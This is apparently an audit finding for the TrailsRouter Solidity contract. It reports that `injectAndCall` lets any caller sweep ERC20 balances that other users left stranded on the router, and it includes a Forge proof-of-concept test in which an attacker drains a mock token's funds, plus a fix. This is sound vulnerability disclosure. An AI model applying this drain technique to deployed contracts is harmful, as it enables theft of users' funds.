  "body": "The router openly exposes `injectAndCall`, which simply forwards whatever ERC20 balance already sits on the router (`_getSelfBalance(token)`) to an arbitrary target chosen by the caller. There is no link between the assets being spent and the caller who supplies the transaction, so any tokens stranded by victims can be forwarded out by the next user. This is exactly the \"Router-held balances are globally drainable\" issue described in the sponsor notes.\n\n## Vulnerable Code\n\n### TrailsRouter.sol (Lines 129-145)\n\n```solidity\nfunction injectAndCall(\n    address token,\n    address target,\n    bytes calldata callData,\n    uint256 amountOffset,\n    bytes32 placeholder\n) public payable {\n    uint256 callerBalance = _getSelfBalance(token);\n    ...\n    _injectAndExecuteCall(token, target, callData, amountOffset, placeholder, callerBalance);\n}\n```\n\n### TrailsRouter.sol (Lines 332-368)\n\n```solidity\nfunction _injectAndExecuteCall(...) internal {\n    ...\n    IERC20 erc20 = IERC20(token);\n    SafeERC20.forceApprove(erc20, target, callerBalance);\n    (bool success, bytes memory result) = target.call(callData);\n    ...\n}\n```\n\n## Proof of Concept\n\nThe new Forge PoC above shows the attack end-to-end: \n\n1. A victim's transfer strands `STUCK_FUNDS` on the router\n2. An attacker immediately calls `injectAndCall` with `callData = token.transfer(attacker, routerHoldings)` to loot those funds without providing any tokens or ETH themselves\n\n## Recommendation\n\nTrack per-call inflows/outflows (or require `msg.value == sum(Call3Value.value)` for ETH), and scope ERC20 spending to the caller's contribution instead of `address(this)` balances, preventing arbitrary users from sweeping previous deposits.",
  "proof_of_concept": "```\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport \"forge-std/Test.sol\";\n\nimport {TrailsRouter} from \"src/TrailsRouter.sol\";\n\ncontract MinimalMockERC20 {\n    string public name = \"Minimal Mock Token\";\n    string public symbol = \"MMT\";\n    uint8 public decimals = 18;\n\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    constructor(address initialHolder, uint256 initialSupply) {\n        balanceOf[initialHolder] = initialSupply;\n        emit Transfer(address(0), initialHolder, initialSupply);\n    }\n\n    function transfer(address to, uint256 value) external returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function approve(address spender, uint256 value) external returns (bool) {\n        allowance[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n        return true;\n    }\n\n    function _transfer(address from, address to, uint256 value) internal {\n        require(balanceOf[from] >= value, \"balance\");\n        balanceOf[from] -= value;\n        balanceOf[to] += value;\n        emit Transfer(from, to, value);\n    }\n}\n\ncontract InjectAndCallSweepPoC is Test {\n    TrailsRouter router;\n    MinimalMockERC20 token;\n\n    address victim = address(0xF00D);\n    address attacker = address(0xBAD5);\n\n    uint256 constant STUCK_FUNDS = 500 ether;\n\n    function setUp() public {\n        router = new TrailsRouter();\n        token = new MinimalMockERC20(victim, STUCK_FUNDS);\n\n        vm.prank(victim);\n        token.transfer(address(router), STUCK_FUNDS);\n\n        assertEq(token.balanceOf(address(router)), STUCK_FUNDS, \"router funded\");\n        assertEq(token.balanceOf(attacker), 0, \"attacker empty\");\n    }\n\n    function test_AttackerDrainsRouterHoldingsViaInjectAndCall() public {\n        uint256 routerHoldings = token.balanceOf(address(router));\n        assertEq(routerHoldings, STUCK_FUNDS, \"sanity\");\n\n        bytes memory callData = abi.encodeWithSelector(\n            token.transfer.selector,\n            attacker,\n            routerHoldings\n        );\n\n        vm.prank(attacker);\n        router.injectAndCall(address(token), address(token), callData, 0, bytes32(0));\n\n        assertEq(token.balanceOf(address(router)), 0, \"router drained\");\n        assertEq(token.balanceOf(attacker), STUCK_FUNDS, \"attacker stole funds\");\n    }\n}",
